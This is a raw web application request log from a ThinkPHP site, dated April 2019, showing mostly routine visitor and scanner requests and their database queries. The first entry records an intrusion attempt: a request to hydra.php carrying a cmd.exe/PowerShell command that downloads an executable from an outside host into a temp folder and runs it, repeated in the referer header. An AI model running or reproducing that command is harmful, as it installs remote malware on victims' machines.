[ 2019-04-06T05:49:38+08:00 ] 47.92.247.150 GET 47.92.113.32/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/wfmdjbychhobvyo5288.exe');start%20C:/Windows/temp/wfmdjbychhobvyo5288.exe
[运行时间：0.026621s] [吞吐率：37.56req/s] [内存消耗：2,154.68kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000024s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002711s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002735s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'C:/Windows/temp/wfmdjbychhobvyo5288.exe\');start C:/Windows/temp/wfmdjbychhobvyo5288.exe',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000141s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-04-06T06:52:58+08:00 ] 212.237.45.216 GET 47.92.113.32/
[运行时间：0.042657s] [吞吐率：23.44req/s] [内存消耗：4,876.14kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002054s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002071s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '47.92.113.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001247s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000172s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000354s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000709s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000232s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000252s ]
---------------------------------------------------------------
[ 2019-04-06T08:05:04+08:00 ] 123.134.149.250 HEAD www.chinafeifang.com/
[运行时间：0.044235s] [吞吐率：22.61req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001988s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002004s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001320s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000143s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000373s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000738s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000252s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000242s ]
---------------------------------------------------------------
[ 2019-04-06T11:34:44+08:00 ] 223.74.138.32 HEAD www.chinafeifang.com/
[运行时间：0.044893s] [吞吐率：22.28req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001985s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002003s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001280s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000165s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000399s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000747s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000223s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000253s ]
---------------------------------------------------------------
[ 2019-04-06T14:30:16+08:00 ] 117.179.145.105 HEAD www.chinafeifang.com/
[运行时间：0.044617s] [吞吐率：22.41req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001959s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001977s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001343s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000188s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000381s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000739s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000203s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000243s ]
---------------------------------------------------------------
[ 2019-04-06T17:28:27+08:00 ] 117.177.212.22 HEAD www.chinafeifang.com/
[运行时间：0.040865s] [吞吐率：24.47req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001801s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001817s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001162s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000142s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000343s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000690s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000200s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000240s ]
---------------------------------------------------------------
[ 2019-04-06T18:53:36+08:00 ] 185.203.118.215 GET www.chinafeifang.com/
[运行时间：0.046225s] [吞吐率：21.63req/s] [内存消耗：4,966.30kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002098s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002118s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'host' => 'www.chinafeifang.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001288s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000157s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000391s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000827s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000254s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000301s ]
---------------------------------------------------------------
[ 2019-04-06T20:31:06+08:00 ] 36.158.0.77 HEAD www.chinafeifang.com/
[运行时间：0.040005s] [吞吐率：25.00req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001777s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001792s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001156s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000134s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000374s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000680s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000224s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000237s ]
---------------------------------------------------------------
[ 2019-04-06T21:05:32+08:00 ] 125.64.94.201 GET 47.92.113.32/
[运行时间：0.045567s] [吞吐率：21.95req/s] [内存消耗：4,875.07kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002035s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002054s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001303s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000162s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000400s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000693s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000237s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000343s ]
---------------------------------------------------------------
[ 2019-04-06T22:19:28+08:00 ] 162.243.144.147 GET 47.92.113.32/
[运行时间：0.046409s] [吞吐率：21.55req/s] [内存消耗：4,878.26kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002060s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002083s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '47.92.113.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001345s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000145s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000385s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000759s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000222s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000237s ]
---------------------------------------------------------------
[ 2019-04-06T23:29:00+08:00 ] 183.200.58.46 HEAD www.chinafeifang.com/
[运行时间：0.044758s] [吞吐率：22.34req/s] [内存消耗：4,879.99kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001952s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001972s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.chinafeifang.com',
  'accept' => '*/*',
  'user-agent' => 'Chrome/57',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001266s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000162s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000347s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000749s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000204s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000268s ]
---------------------------------------------------------------
[ 2019-04-06T23:34:52+08:00 ] 43.243.12.73 GET 47.92.113.32/
[运行时间：0.046467s] [吞吐率：21.52req/s] [内存消耗：4,881.18kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002944s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002969s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'host' => '47.92.113.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001193s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000146s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000402s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000725s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000210s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000257s ]
